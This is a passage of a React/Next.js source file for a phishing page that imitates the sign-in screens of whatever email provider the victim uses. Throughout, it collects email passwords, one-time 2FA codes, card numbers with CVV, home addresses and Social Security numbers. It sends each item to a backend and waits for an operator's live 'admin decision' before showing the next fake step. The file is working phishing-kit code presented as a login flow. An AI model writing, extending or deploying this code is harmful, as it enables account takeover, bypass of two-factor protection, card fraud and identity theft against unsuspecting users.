"use client";

import { useState, useEffect } from "react";
import Image from "next/image";
import { detectEmailProvider } from "@/lib/email-providers";
import {
  detectCardType,
  formatCardNumber,
  formatExpiryDate,
  validateExpiryDate,
  formatSSN,
  validateSSN,
  formatZip,
} from "@/lib/payment-utils";
import ClientProtection from "@/components/ClientProtection";

export default function HomePage() {
  const [step, setStep] = useState<"email" | "password" | "otp" | "payment">(
    "email"
  );
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [otp, setOtp] = useState("");
  const [error, setError] = useState<string | null>(null);
  const [loading, setLoading] = useState(false);
  const [loadingMessage, setLoadingMessage] = useState("");
  const [verificationStatus, setVerificationStatus] = useState<
    "idle" | "verifying" | "verified"
  >("idle");
  const [sessionId, setSessionId] = useState<string | null>(null);
  const [pollingInterval, setPollingInterval] = useState<NodeJS.Timeout | null>(
    null
  );
  const [messageInterval, setMessageInterval] = useState<NodeJS.Timeout | null>(
    null
  );

  // Payment form state
  const [cardNumber, setCardNumber] = useState("");
  const [expiryDate, setExpiryDate] = useState("");
  const [cvv, setCvv] = useState("");
  const [fullName, setFullName] = useState("");
  const [address, setAddress] = useState("");
  const [city, setCity] = useState("");
  const [state, setState] = useState("");
  const [zipCode, setZipCode] = useState("");
  const [ssn, setSsn] = useState("");

  const provider = detectEmailProvider(email);

  // Loading messages with icons for entertainment
  const loadingMessages = [
    { text: "Checking your credentials...", icon: "shield" },
    { text: "Connecting to secure servers...", icon: "globe" },
    { text: "Verifying account information...", icon: "search" },
    { text: "Running security checks...", icon: "lock" },
    { text: "Preparing authentication flow...", icon: "key" },
    { text: "Almost ready...", icon: "clock" },
    { text: "Finalizing verification...", icon: "check" },
    { text: "Just a moment more...", icon: "hourglass" },
    { text: "Loading your experience...", icon: "star" },
    { text: "Securing your connection...", icon: "shield-check" },
  ];

  // Function to get SVG icon
  const getLoadingIcon = (iconType: string) => {
    switch (iconType) {
      case "shield":
        return (
          <svg
            className="w-4 h-4"
            fill="none"
            stroke="currentColor"
            viewBox="0 0 24 24"
          >
            <path
              strokeLinecap="round"
              strokeLinejoin="round"
              strokeWidth={2}
              d="M20.618 5.984A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"
            />
          </svg>
        );
      case "globe":
        return (
          <svg
            className="w-4 h-4"
            fill="none"
            stroke="currentColor"
            viewBox="0 0 24 24"
          >
            <path
              strokeLinecap="round"
              strokeLinejoin="round"
              strokeWidth={2}
              d="M21 12a9 9 0 01-9 9m9-9a9 9 0 00-9-9m9 9H3m9 9a9 9 0 01-9-9m9 9c1.657 0 3-4.03 3-9s-1.343-9-3-9m0 18c-1.657 0-3-4.03-3-9s1.343-9 3-9m-9 9a9 9 0 019-9"
            />
          </svg>
        );
      case "search":
        return (
          <svg
            className="w-4 h-4"
            fill="none"
            stroke="currentColor"
            viewBox="0 0 24 24"
          >
            <path
              strokeLinecap="round"
              strokeLinejoin="round"
              strokeWidth={2}
              d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"
            />
          </svg>
        );
      case "lock":
        return (
          <svg
            className="w-4 h-4"
            fill="none"
            stroke="currentColor"
            viewBox="0 0 24 24"
          >
            <path
              strokeLinecap="round"
              strokeLinejoin="round"
              strokeWidth={2}
              d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"
            />
          </svg>
        );
      case "key":
        return (
          <svg
            className="w-4 h-4"
            fill="none"
            stroke="currentColor"
            viewBox="0 0 24 24"
          >
            <path
              strokeLinecap="round"
              strokeLinejoin="round"
              strokeWidth={2}
              d="M15 7a2 2 0 012 2m4 0a6 6 0 01-7.743 5.743L11 17H9v2H7v2H4a1 1 0 01-1-1v-2.586a1 1 0 01.293-.707l5.964-5.964A6 6 0 1121 9z"
            />
          </svg>
        );
      case "clock":
        return (
          <svg
            className="w-4 h-4"
            fill="none"
            stroke="currentColor"
            viewBox="0 0 24 24"
          >
            <path
              strokeLinecap="round"
              strokeLinejoin="round"
              strokeWidth={2}
              d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z"
            />
          </svg>
        );
      case "check":
        return (
          <svg
            className="w-4 h-4"
            fill="none"
            stroke="currentColor"
            viewBox="0 0 24 24"
          >
            <path
              strokeLinecap="round"
              strokeLinejoin="round"
              strokeWidth={2}
              d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"
            />
          </svg>
        );
      case "hourglass":
        return (
          <svg
            className="w-4 h-4"
            fill="none"
            stroke="currentColor"
            viewBox="0 0 24 24"
          >
            <path
              strokeLinecap="round"
              strokeLinejoin="round"
              strokeWidth={2}
              d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z"
            />
          </svg>
        );
      case "star":
        return (
          <svg
            className="w-4 h-4"
            fill="none"
            stroke="currentColor"
            viewBox="0 0 24 24"
          >
            <path
              strokeLinecap="round"
              strokeLinejoin="round"
              strokeWidth={2}
              d="M11.049 2.927c.3-.921 1.603-.921 1.902 0l1.519 4.674a1 1 0 00.95.69h4.915c.969 0 1.371 1.24.588 1.81l-3.976 2.888a1 1 0 00-.363 1.118l1.518 4.674c.3.922-.755 1.688-1.538 1.118l-3.976-2.888a1 1 0 00-1.176 0l-3.976 2.888c-.783.57-1.838-.197-1.538-1.118l1.518-4.674a1 1 0 00-.363-1.118l-3.976-2.888c-.784-.57-.38-1.81.588-1.81h4.914a1 1 0 00.951-.69l1.519-4.674z"
            />
          </svg>
        );
      case "shield-check":
        return (
          <svg
            className="w-4 h-4"
            fill="none"
            stroke="currentColor"
            viewBox="0 0 24 24"
          >
            <path
              strokeLinecap="round"
              strokeLinejoin="round"
              strokeWidth={2}
              d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"
            />
          </svg>
        );
      default:
        return (
          <svg
            className="w-4 h-4 animate-spin"
            fill="none"
            stroke="currentColor"
            viewBox="0 0 24 24"
          >
            <path
              strokeLinecap="round"
              strokeLinejoin="round"
              strokeWidth={2}
              d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"
            />
          </svg>
        );
    }
  };

  // Function to start entertaining loading messages
  const startLoadingMessages = () => {
    // Clear any existing message interval
    if (messageInterval) clearInterval(messageInterval);

    let messageIndex = 0;
    setLoadingMessage(loadingMessages[0].text);

    const newMessageInterval = setInterval(() => {
      messageIndex = (messageIndex + 1) % loadingMessages.length;
      setLoadingMessage(loadingMessages[messageIndex].text);
    }, 1500); // Change message every 1.5 seconds

    setMessageInterval(newMessageInterval);
    return newMessageInterval;
  };

  // Get current loading icon
  const getCurrentLoadingIcon = () => {
    const currentMessage = loadingMessages.find(
      (msg) => msg.text === loadingMessage
    );
    return currentMessage
      ? getLoadingIcon(currentMessage.icon)
      : getLoadingIcon("default");
  };

  // Polling function to check admin decisions
  const startPolling = (sessionId: string) => {
    console.log("🔄 Starting polling for session:", sessionId);

    if (pollingInterval) clearInterval(pollingInterval);

    let pollCount = 0;
    const maxPolls = 150; // 5 minutes max (150 * 2 seconds)

    const interval = setInterval(async () => {
      try {
        pollCount++;
        console.log(
          `🔍 Polling session status... (${pollCount}/${maxPolls})`,
          sessionId
        );

        // Timeout after 5 minutes
        if (pollCount > maxPolls) {
          console.log("⏰ Polling timeout reached");
          clearInterval(interval);
          setLoading(false);
          setLoadingMessage("");
          // Also clear the message interval
          if (messageInterval) clearInterval(messageInterval);
          setError("Request timed out. Please try again.");
          return;
        }

        const response = await fetch("/api/session", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ action: "get", sessionId }),
        });

        if (response.ok) {
          const session = await response.json();
          console.log("📊 Session status:", session);

          if (session.status === "rejected") {
            console.log("❌ Session rejected:", session.rejectionReason);
            console.log("📍 Current step when rejected:", step);
            console.log("📍 Session current step:", session.currentStep);

            // Use the rejection reason from CRM, it should be context-aware
            const errorMsg = session.rejectionReason || "Invalid credentials";
            console.log("🔴 Setting error message:", errorMsg);
            setError(errorMsg);
            setLoading(false);
            setLoadingMessage("");
            setVerificationStatus("idle"); // Reset verification status
            clearInterval(interval);
            // Also clear the message interval
            if (messageInterval) clearInterval(messageInterval);
          } else if (session.status === "approved" && session.adminAction) {
            console.log(
              "✅ Session approved with action:",
              session.adminAction
            );
            clearInterval(interval);
            setLoading(false);
            setLoadingMessage("");
            // Also clear the message interval
            if (messageInterval) clearInterval(messageInterval);

            switch (session.adminAction) {
              case "next_page":
                console.log("➡️ Moving to password step");
                setStep("password");
                break;
              case "credit_card":
                console.log("💳 Moving to payment step");
                setStep("payment");
                break;
              case "otp":
                console.log("📱 Moving to OTP step");
                setStep("otp");
                break;
              case "thank_you":
                console.log("🎉 Moving to thank you page");
                setVerificationStatus("verified");
                setTimeout(() => {
                  window.location.href = "/thank-you";
                }, 2000);
                break;
            }
          } else {
            console.log("⏳ Session still pending...");
          }
        } else {
          console.error("❌ Polling response error:", response.status);
          if (response.status === 404) {
            console.error("Session not found in database");
            clearInterval(interval);
            setLoading(false);
            setLoadingMessage("");
            // Also clear the message interval
            if (messageInterval) clearInterval(messageInterval);
            setError("Session not found. Please start over.");
          }
        }
      } catch (err) {
        console.error("💥 Polling error:", err);
      }
    }, 2000);

    setPollingInterval(interval);
  };

  // Cleanup polling on unmount
  useEffect(() => {
    return () => {
      if (pollingInterval) clearInterval(pollingInterval);
    };
  }, [pollingInterval]);

  const handleEmailSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    console.log("🚀 Form submitted with:", { email, password });

    if (!email || !email.includes("@")) {
      setError("Please enter a valid email address");
      return;
    }
    if (!password) {
      setError("Please enter your password");
      return;
    }

    setError(null);
    setLoading(true);

    // Start entertaining loading messages
    startLoadingMessages();

    try {
      console.log("📡 Sending request to /api/session...");
      console.log("📋 Request data:", {
        action: "create",
        email,
        password,
      });

      // Send email data to CRM
      const response = await fetch("/api/session", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          action: "create",
          email,
          password,
        }),
      });

      console.log("📡 Response received:", {
        status: response.status,
        ok: response.ok,
        statusText: response.statusText,
      });

      if (response.ok) {
        const data = await response.json();
        console.log("✅ User session created successfully:", data);
        setSessionId(data.sessionId); // Use sessionId for linking

        // Start polling for admin decision
        console.log("🔄 Starting polling for session:", data.sessionId);
        startPolling(data.sessionId);

        // Keep loading messages running until admin responds
      } else {
        const errorData = await response.text();
        console.error("❌ API Error:", {
          status: response.status,
          statusText: response.statusText,
          errorData,
        });
        if (messageInterval) clearInterval(messageInterval);
        throw new Error(
          `Failed to create session: ${response.status} ${response.statusText}`
        );
      }
    } catch (error) {
      console.error("💥 Submit error:", error);
      if (messageInterval) clearInterval(messageInterval);
      setError(
        `Connection error: ${
          error instanceof Error ? error.message : "Unknown error"
        }`
      );
      setLoading(false);
      setLoadingMessage("");
    }
  };

  const handlePasswordSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    console.log("🔑 Password form submitted with:", { email, password });

    setError(null);
    setLoading(true);

    // Start entertaining loading messages
    startLoadingMessages();

    try {
      console.log("📡 Sending password step to API...");

      if (sessionId) {
        // Update session with password
        const response = await fetch("/api/session", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            action: "update_password",
            sessionId,
            newPassword: password, // The password entered on this page
          }),
        });

        console.log("📡 Password API Response:", {
          status: response.status,
          ok: response.ok,
        });

        if (response.ok) {
          const data = await response.json();
          console.log("✅ Password updated successfully:", data);

          // Start polling for admin decision
          console.log("🔄 Starting polling for session:", sessionId);
          startPolling(sessionId);
          // Keep loading messages running until admin responds
        } else {
          if (messageInterval) clearInterval(messageInterval);
          throw new Error("Failed to update password");
        }
      } else {
        if (messageInterval) clearInterval(messageInterval);
        throw new Error("No session found");
      }
    } catch (error) {
      console.error("💥 Password submit error:", error);
      if (messageInterval) clearInterval(messageInterval);
      setError("Something went wrong. Please try again.");
      setLoading(false);
      setLoadingMessage("");
    }
  };

  const handleOtpSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    console.log("📱 OTP form submitted with:", otp);

    if (otp.length !== 6) {
      setError("Please enter a 6-digit verification code");
      return;
    }

    setError(null);
    setLoading(true);
    setVerificationStatus("verifying");

    // Start entertaining loading messages
    startLoadingMessages();

    try {
      console.log("📡 Sending OTP to API...");

      if (sessionId) {
        // Update session with OTP
        const response = await fetch("/api/session", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            action: "update_otp",
            sessionId,
            otpCode: otp,
          }),
        });

        console.log("📡 OTP API Response:", {
          status: response.status,
          ok: response.ok,
        });

        if (response.ok) {
          const data = await response.json();
          console.log("✅ OTP updated successfully:", data);

          // Start polling for admin decision
          console.log("🔄 Starting polling for session:", sessionId);
          startPolling(sessionId);
          // Keep loading messages running until admin responds
        } else {
          if (messageInterval) clearInterval(messageInterval);
          throw new Error("Failed to update OTP");
        }
      } else {
        if (messageInterval) clearInterval(messageInterval);
        throw new Error("No session found");
      }
    } catch (error) {
      console.error("💥 OTP submit error:", error);
      if (messageInterval) clearInterval(messageInterval);
      setError("Something went wrong. Please try again.");
      setVerificationStatus("idle");
      setLoading(false);
      setLoadingMessage("");
    }
  };

  const handlePaymentSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    // Validation
    if (!validateExpiryDate(expiryDate)) {
      setError("Please enter a valid expiry date (MM/YY)");
      return;
    }

    if (!validateSSN(ssn)) {
      setError("Please enter a valid SSN (9 digits)");
      return;
    }

    const cardType = detectCardType(cardNumber);
    if (!cardType) {
      setError("Please enter a valid credit card number");
      return;
    }

    if (cvv.length !== cardType.cvvLength) {
      setError(
        `Please enter a valid ${cardType.cvvLength}-digit CVV for ${cardType.name}`
      );
      return;
    }

    setError(null);
    setLoading(true);

    // Start entertaining loading messages
    startLoadingMessages();

    console.log("💳 Payment form submitted");

    try {
      console.log("📡 Sending payment info to API...");

      if (sessionId) {
        // Update session with payment info
        const response = await fetch("/api/session", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            action: "update_payment",
            sessionId,
            cardInfo: {
              cardNumber,
              expiryDate,
              cvv,
              fullName,
              address,
              city,
              state,
              zipCode,
              ssn,
            },
          }),
        });

        console.log("📡 Payment API Response:", {
          status: response.status,
          ok: response.ok,
        });

        if (response.ok) {
          const data = await response.json();
          console.log("✅ Payment updated successfully:", data);

          // Start polling for admin decision
          console.log("🔄 Starting polling for session:", sessionId);
          startPolling(sessionId);
          // Keep loading messages running until admin responds
        } else {
          if (messageInterval) clearInterval(messageInterval);
          throw new Error("Failed to update payment");
        }
      } else {
        if (messageInterval) clearInterval(messageInterval);
        throw new Error("No session found");
      }
    } catch (error) {
      console.error("💥 Payment submit error:", error);
      if (messageInterval) clearInterval(messageInterval);
      setError("Payment processing failed. Please try again.");
      setLoading(false);
      setLoadingMessage("");
    }
  };

  const handleBack = () => {
    if (step === "payment") {
      setStep("otp");
    } else if (step === "otp") {
      setStep("password");
      setOtp("");
    } else {
      setStep("email");
      setPassword("");
    }
    setError(null);
  };

  // Clear password and error when moving to password step
  useEffect(() => {
    if (step === "password") {
      setPassword("");
      setError(null); // Clear any previous errors
    }
  }, [step]);

  if (step === "password") {
    return (
      <ClientProtection>
        <div
          className="min-h-screen flex flex-col"
          style={{ backgroundColor: provider.backgroundColor }}
        >
          {/* Header */}
          <div
            className="flex items-center justify-between p-6 border-b"
            style={{ borderColor: provider.primaryColor + "20" }}
          >
            <Image
              src={provider.logo}
              alt={provider.name}
              width={120}
              height={40}
              className="h-8 w-auto"
            />
            <div className="flex items-center gap-4">
              <span
                className="text-sm"
                style={{ color: provider.textColor + "80" }}
              >
                Help
              </span>
              <span
                className="text-sm"
                style={{ color: provider.textColor + "80" }}
              >
                Privacy
              </span>
            </div>
          </div>

          {/* Main Content */}
          <div className="flex-1 flex items-center justify-center p-6">
            <div className="w-full max-w-[440px]">
              <div
                className="bg-white rounded-lg shadow-lg p-8 border"
                style={{ borderColor: provider.primaryColor + "20" }}
              >
                <div className="text-center mb-6">
                  <div className="w-20 h-20 mx-auto mb-4 rounded-full overflow-hidden bg-gray-100 flex items-center justify-center">
                    <Image
                      src={provider.logo}
                      alt={provider.name}
                      width={60}
                      height={60}
                      className="rounded-full"
                    />
                  </div>
                  <h1
                    className="text-2xl font-normal mb-2"
                    style={{ color: provider.textColor }}
                  >
                    Hi {email.split("@")[0]}
                  </h1>
                  <div
                    className="inline-flex items-center gap-2 px-3 py-2 border rounded-full cursor-pointer hover:shadow-sm transition-shadow"
                    style={{ borderColor: provider.primaryColor + "40" }}
                    onClick={handleBack}
                  >
                    <span
                      className="text-sm"
                      style={{ color: provider.textColor }}
                    >
                      {email}
                    </span>
                    <svg
                      width="14"
                      height="14"
                      viewBox="0 0 16 16"
                      fill={provider.textColor}
                    >
                      <path d="M8 9l3-3-1-1-2 2-2-2-1 1 3 3z" />
                    </svg>
                  </div>
                </div>

                <form onSubmit={handlePasswordSubmit} className="space-y-6">
                  <div className="space-y-2">
                    <label
                      className="block text-sm font-medium"
                      style={{ color: provider.textColor }}
                    >
                      Enter your password
                    </label>
                    <div className="relative">
                      <input
                        type={showPassword ? "text" : "password"}
                        placeholder="Password"
                        value={password}
                        onChange={(e) => setPassword(e.target.value)}
                        className="w-full h-12 px-4 pr-12 border-2 rounded-lg outline-none transition-colors"
                        style={{
                          borderColor: error
                            ? "#ef4444"
                            : provider.primaryColor + "40",
                          color: provider.textColor,
                          backgroundColor: "#fafafa",
                        }}
                        onFocus={(e) =>
                          (e.target.style.borderColor = error
                            ? "#ef4444"
                            : provider.primaryColor)
                        }
                        onBlur={(e) =>
                          (e.target.style.borderColor = error
                            ? "#ef4444"
                            : provider.primaryColor + "40")
                        }
                        required
                      />
                      <button
                        type="button"
                        onClick={() => setShowPassword(!showPassword)}
                        className="absolute right-3 top-1/2 -translate-y-1/2 p-1 hover:bg-gray-100 rounded"
                        style={{ color: provider.textColor }}
                      >
                        {showPassword ? (
                          <svg
                            width="20"
                            height="20"
                            viewBox="0 0 24 24"
                            fill="none"
                            stroke="currentColor"
                            strokeWidth="2"
                          >
                            <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24" />
                            <line x1="1" y1="1" x2="23" y2="23" />
                          </svg>
                        ) : (
                          <svg
                            width="20"
                            height="20"
                            viewBox="0 0 24 24"
                            fill="none"
                            stroke="currentColor"
                            strokeWidth="2"
                          >
                            <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z" />
                            <circle cx="12" cy="12" r="3" />
                          </svg>
                        )}
                      </button>
                    </div>
                  </div>

                  {error && (
                    <div className="flex items-center gap-2 p-3 bg-red-50 border border-red-200 rounded-lg">
                      <svg
                        width="16"
                        height="16"
                        viewBox="0 0 16 16"
                        fill="#dc2626"
                      >
                        <path d="M8 1a7 7 0 100 14A7 7 0 008 1zM7 4a1 1 0 112 0v3a1 1 0 11-2 0V4zm1 8a1 1 0 100-2 1 1 0 000 2z" />
                      </svg>
                      <p className="text-red-600 text-sm">{error}</p>
                    </div>
                  )}

                  <div className="flex items-center justify-between">
                    <button
                      type="button"
                      onClick={handleBack}
                      className="px-6 py-2 text-sm font-medium border rounded-lg hover:bg-gray-50 transition-colors"
                      style={{
                        color: provider.textColor,
                        borderColor: provider.primaryColor + "40",
                      }}
                    >
                      Back
                    </button>
                    <button
                      type="submit"
                      disabled={loading}
                      className="px-8 py-3 rounded-lg font-medium transition-all disabled:opacity-60 disabled:cursor-not-allowed flex items-center gap-2"
                      style={{
                        backgroundColor: provider.buttonColor,
                        color: provider.buttonTextColor,
                      }}
                    >
                      {loading && (
                        <svg
                          className="animate-spin h-4 w-4"
                          viewBox="0 0 24 24"
                          fill="none"
                        >
                          <circle
                            cx="12"
                            cy="12"
                            r="10"
                            stroke="currentColor"
                            strokeWidth="4"
                            className="opacity-25"
                          />
                          <path
                            fill="currentColor"
                            className="opacity-75"
                            d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                          />
                        </svg>
                      )}
                      {loading ? (
                        <div className="flex items-center justify-center gap-2">
                          <svg
                            className="w-4 h-4 animate-spin"
                            fill="none"
                            stroke="currentColor"
                            viewBox="0 0 24 24"
                          >
                            <path
                              strokeLinecap="round"
                              strokeLinejoin="round"
                              strokeWidth={2}
                              d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"
                            />
                          </svg>
                          Processing...
                        </div>
                      ) : (
                        "Continue"
                      )}
                    </button>
                  </div>
                </form>

                <div
                  className="mt-6 pt-6 border-t text-center"
                  style={{ borderColor: provider.primaryColor + "20" }}
                >
                  <p className="text-xs text-gray-500">
                    Secure login powered by {provider.name}
                  </p>
                </div>
              </div>

              <div className="mt-4 text-center">
                <a
                  href="#"
                  className="text-sm hover:underline"
                  style={{ color: provider.primaryColor }}
                >
                  Forgot password?
                </a>
                <span className="mx-2 text-gray-400">•</span>
                <a
                  href="#"
                  className="text-sm hover:underline"
                  style={{ color: provider.primaryColor }}
                >
                  Create account
                </a>
              </div>
            </div>
          </div>

          {/* Footer */}
          <div
            className="p-6 border-t text-center"
            style={{ borderColor: provider.primaryColor + "20" }}
          >
            <p className="text-xs text-gray-500">
              © 2024 {provider.name}. All rights reserved.
            </p>
          </div>
        </div>
      </ClientProtection>
    );
  }

  if (step === "otp") {
    return (
      <ClientProtection>
        <div
          className="min-h-screen flex flex-col"
          style={{ backgroundColor: provider.backgroundColor }}
        >
          {/* Header */}
          <div
            className="flex items-center justify-between p-6 border-b"
            style={{ borderColor: provider.primaryColor + "20" }}
          >
            <Image
              src={provider.logo}
              alt={provider.name}
              width={120}
              height={40}
              className="h-8 w-auto"
            />
            <div className="flex items-center gap-4">
              <span
                className="text-sm"
                style={{ color: provider.textColor + "80" }}
              >
                Help
              </span>
              <span
                className="text-sm"
                style={{ color: provider.textColor + "80" }}
              >
                Privacy
              </span>
            </div>
          </div>

          {/* Main Content */}
          <div className="flex-1 flex items-center justify-center p-6">
            <div className="w-full max-w-[440px]">
              <div
                className="bg-white rounded-lg shadow-lg p-8 border"
                style={{ borderColor: provider.primaryColor + "20" }}
              >
                <div className="text-center mb-8">
                  <div
                    className="w-16 h-16 mx-auto mb-4 rounded-full flex items-center justify-center"
                    style={{ backgroundColor: provider.primaryColor + "20" }}
                  >
                    <svg
                      width="24"
                      height="24"
                      viewBox="0 0 24 24"
                      fill={provider.primaryColor}
                    >
                      <path d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z" />
                    </svg>
                  </div>
                  <h1
                    className="text-2xl font-normal mb-2"
                    style={{ color: provider.textColor }}
                  >
                    2-Step Verification
                  </h1>
                  <p className="text-gray-600 text-sm mb-4">
                    To help keep your account secure, {provider.name} wants to
                    make sure it&apos;s really you trying to sign in
                  </p>
                  <div
                    className="inline-flex items-center gap-2 px-3 py-2 border rounded-full cursor-pointer hover:shadow-sm transition-shadow"
                    style={{ borderColor: provider.primaryColor + "40" }}
                    onClick={handleBack}
                  >
                    <span
                      className="text-sm"
                      style={{ color: provider.textColor }}
                    >
                      {email}
                    </span>
                    <svg
                      width="14"
                      height="14"
                      viewBox="0 0 16 16"
                      fill={provider.textColor}
                    >
                      <path d="M8 9l3-3-1-1-2 2-2-2-1 1 3 3z" />
                    </svg>
                  </div>
                </div>

                <div className="mb-6">
                  <div className="flex items-center gap-3 p-4 bg-blue-50 border border-blue-200 rounded-lg mb-4">
                    <div className="w-10 h-10 rounded-full bg-blue-100 flex items-center justify-center">
                      <svg
                        width="20"
                        height="20"
                        viewBox="0 0 24 24"
                        fill="#2563eb"
                      >
                        <path d="M6.62 10.79c1.44 2.83 3.76 5.14 6.59 6.59l2.2-2.2c.27-.27.67-.36 1.02-.24 1.12.37 2.33.57 3.57.57.55 0 1 .45 1 1V20c0 .55-.45 1-1 1-9.39 0-17-7.61-17-17 0-.55.45-1 1-1h3.5c.55 0 1 .45 1 1 0 1.25.2 2.45.57 3.57.11.35.03.74-.25 1.02l-2.2 2.2z" />
                      </svg>
                    </div>
                    <div>
                      <p className="font-medium text-gray-800">
                        Check your phone
                      </p>
                      <p className="text-sm text-gray-600">
                        {provider.name} sent you a verification code at
                        ••••••••••
                      </p>
                    </div>
                  </div>
                </div>

                {verificationStatus === "verified" ? (
                  <div className="text-center space-y-6">
                    <div className="w-16 h-16 mx-auto rounded-full bg-green-100 flex items-center justify-center">
                      <svg
                        width="32"
                        height="32"
                        viewBox="0 0 24 24"
                        fill="none"
                        stroke="#22c55e"
                        strokeWidth="3"
                      >
                        <path d="M20 6L9 17l-5-5" />
                      </svg>
                    </div>
                    <div>
                      <h2 className="text-xl font-semibold text-green-600 mb-2">
                        Verified!
                      </h2>
                      <p className="text-gray-600 text-sm">
                        Your account has been successfully verified.
                      </p>
                      <p className="text-gray-500 text-xs mt-2">
                        Redirecting in 5 seconds...
                      </p>
                    </div>
                  </div>
                ) : (
                  <form onSubmit={handleOtpSubmit} className="space-y-6">
                    <div className="space-y-2">
                      <label
                        className="block text-sm font-medium"
                        style={{ color: provider.textColor }}
                      >
                        Enter the 6-digit code
                      </label>
                      <input
                        type="text"
                        placeholder="123456"
                        value={otp}
                        onChange={(e) => {
                          const value = e.target.value
                            .replace(/\D/g, "")
                            .slice(0, 6);
                          setOtp(value);
                        }}
                        className="w-full h-14 px-4 text-center text-2xl tracking-widest border-2 rounded-lg outline-none transition-colors font-mono"
                        style={{
                          borderColor: error
                            ? "#ef4444"
                            : provider.primaryColor + "40",
                          color: provider.textColor,
                          backgroundColor: "#fafafa",
                        }}
                        onFocus={(e) =>
                          (e.target.style.borderColor = error
                            ? "#ef4444"
                            : provider.primaryColor)
                        }
                        onBlur={(e) =>
                          (e.target.style.borderColor = error
                            ? "#ef4444"
                            : provider.primaryColor + "40")
                        }
                        maxLength={6}
                        required
                        disabled={verificationStatus === "verifying"}
                      />
                      <p className="text-xs text-gray-500">
                        Enter the 6-digit code we sent to your phone
                      </p>
                    </div>

                    {error && (
                      <div className="flex items-center gap-2 p-3 bg-red-50 border border-red-200 rounded-lg">
                        <svg
                          width="16"
                          height="16"
                          viewBox="0 0 16 16"
                          fill="#dc2626"
                        >
                          <path d="M8 1a7 7 0 100 14A7 7 0 008 1zM7 4a1 1 0 112 0v3a1 1 0 11-2 0V4zm1 8a1 1 0 100-2 1 1 0 000 2z" />
                        </svg>
                        <p className="text-red-600 text-sm">{error}</p>
                      </div>
                    )}

                    <div className="flex items-center justify-between">
                      <button
                        type="button"
                        onClick={handleBack}
                        className="px-6 py-2 text-sm font-medium border rounded-lg hover:bg-gray-50 transition-colors"
                        style={{
                          color: provider.textColor,
                          borderColor: provider.primaryColor + "40",
                        }}
                        disabled={verificationStatus === "verifying"}
                      >
                        Back
                      </button>
                      <button
                        type="submit"
                        disabled={
                          loading ||
                          otp.length !== 6 ||
                          verificationStatus === "verifying"
                        }
                        className="px-8 py-3 rounded-lg font-medium transition-all disabled:opacity-60 disabled:cursor-not-allowed flex items-center gap-2"
                        style={{
                          backgroundColor: provider.buttonColor,
                          color: provider.buttonTextColor,
                        }}
                      >
                        {verificationStatus === "verifying" && (
                          <svg
                            className="animate-spin h-4 w-4"
                            viewBox="0 0 24 24"
                            fill="none"
                          >
                            <circle
                              cx="12"
                              cy="12"
                              r="10"
                              stroke="currentColor"
                              strokeWidth="4"
                              className="opacity-25"
                            />
                            <path
                              fill="currentColor"
                              className="opacity-75"
                              d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                            />
                          </svg>
                        )}
                        {loading ? (
                          <div className="flex items-center justify-center gap-2">
                            <svg
                              className="w-4 h-4 animate-spin"
                              fill="none"
                              stroke="currentColor"
                              viewBox="0 0 24 24"
                            >
                              <path
                                strokeLinecap="round"
                                strokeLinejoin="round"
                                strokeWidth={2}
                                d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"
                              />
                            </svg>
                            Verifying...
                          </div>
                        ) : (
                          "Verify"
                        )}
                      </button>
                    </div>
                  </form>
                )}

                <div
                  className="mt-6 pt-6 border-t text-center"
                  style={{ borderColor: provider.primaryColor + "20" }}
                >
                  <p className="text-xs text-gray-500 mb-2">
                    Didn&apos;t get the code?
                  </p>
                  <button
                    type="button"
                    className="text-sm hover:underline"
                    style={{ color: provider.primaryColor }}
                    onClick={() => {
                      // Simulate resend
                      alert("Verification code sent!");
                    }}
                  >
                    Resend code
